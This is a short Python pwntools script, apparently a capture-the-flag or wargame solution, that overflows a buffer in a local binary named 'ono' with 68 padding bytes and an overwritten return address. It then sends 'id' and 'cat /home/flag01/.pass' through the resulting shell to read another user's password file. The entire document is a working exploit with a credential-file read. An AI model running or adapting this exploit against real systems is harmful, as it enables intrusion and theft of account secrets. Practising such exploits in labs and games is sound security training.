#!/usr/bin/env python3
from pwn import *

BINARY = "./ono"
context.binary = elf = ELF(BINARY, checksec=False)
context.arch = "amd64"
context.log_level = "error"

payload = b"ONO_" + b"A" * 68 + p64(0x401292)

io = process(BINARY)
io.sendafter(b"Waiting for operator ID:", payload + b"\n")
io.sendline(b"id")
io.sendline(b"cat /home/flag01/.pass")
out = io.recvall(timeout=3)
print(out.decode(errors="replace"), flush=True)

if b"flag01" in out:
    print("[+] flag01, password printed above", flush=True)
else:
    print("[-] failed, see output above", flush=True)
